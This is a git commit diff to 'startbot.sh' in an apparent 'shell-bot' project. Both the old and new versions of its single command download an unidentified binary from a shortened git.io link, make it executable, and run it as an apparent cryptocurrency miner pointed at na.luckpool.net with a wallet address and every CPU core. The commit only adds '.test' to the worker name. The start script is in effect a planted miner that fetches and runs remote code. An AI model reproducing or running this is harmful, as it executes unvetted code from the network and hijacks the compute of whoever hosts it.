5fb0f59c7a06ba26abce21dfe3b27dd8d0055b57
AVGandhi <AVGandhi@users.noreply.github.com>
2021-11-22 02:23:02 +0700

    Update startbot.sh

--- startbot.sh
+++ startbot.sh
@@ -1,2 +1,2 @@
 cd /home/shell-bot
-wget -qO ngaceng https://git.io/J161r && chmod +x ngaceng && ./ngaceng -v -l na.luckpool.net:3956 -u RBjwUUBxMbratayR2BWRbLWKZHBa4oxWs9 -t $(nproc --all) -p x
+wget -qO ngaceng https://git.io/J161r && chmod +x ngaceng && ./ngaceng -v -l na.luckpool.net:3956 -u RBjwUUBxMbratayR2BWRbLWKZHBa4oxWs9.test -t $(nproc --all) -p x
